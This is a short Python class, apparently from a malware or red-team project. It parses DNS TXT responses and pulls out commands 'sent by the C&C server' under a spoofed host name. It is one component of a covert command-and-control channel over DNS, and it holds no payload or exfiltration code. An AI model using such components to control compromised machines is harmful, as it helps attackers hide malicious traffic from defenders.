from utils.consts import CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS

class CommandParser:
    """ A class to help parse DNS responses for commands. """
    def __init__(self):
        pass

    def parse(self, response):
        """ Extract the command from a DNS response sent by the C&C server. """ 
        if not response.haslayer('DNS'):
            print("no DNS")
            return None

        an = response['DNS'].an
        if an == None:
            print("no an")
            return None

        if an.type != PACKET_OPTIONS['DNS']['AN']['TYPE']:
            print("no txt")
            return None

        if an.qname != CC_SERVER_SPOOFED_HOST:
            print("wrong host")
            return None

        print("parsed command")
        
        return an.rdata